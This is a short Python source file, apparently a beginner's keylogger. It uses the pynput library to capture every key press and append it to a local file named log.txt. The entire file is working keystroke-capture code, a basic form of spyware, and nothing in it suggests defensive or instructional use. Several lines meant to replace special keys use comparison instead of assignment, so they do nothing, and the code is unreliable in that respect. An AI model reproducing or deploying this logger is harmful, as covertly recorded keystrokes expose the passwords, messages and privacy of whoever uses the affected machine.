from pynput.keyboard import Listener
#store in keystroke in a text fileo
# use of the with keyword = releasee the memory automatically 
def writetofile(key):
    letter = str(key)
    letter=letter.replace("'"," ")
    if letter == "Key.space":
        letter == '  '
    if letter == "Key.enter":
        letter == "\n"
    if letter == "Key.shift":
        letter == '  '
    with open("log.txt", "a") as f:
        f.write(letter)
with Listener(on_press=writetofile) as l:
    l.join()
    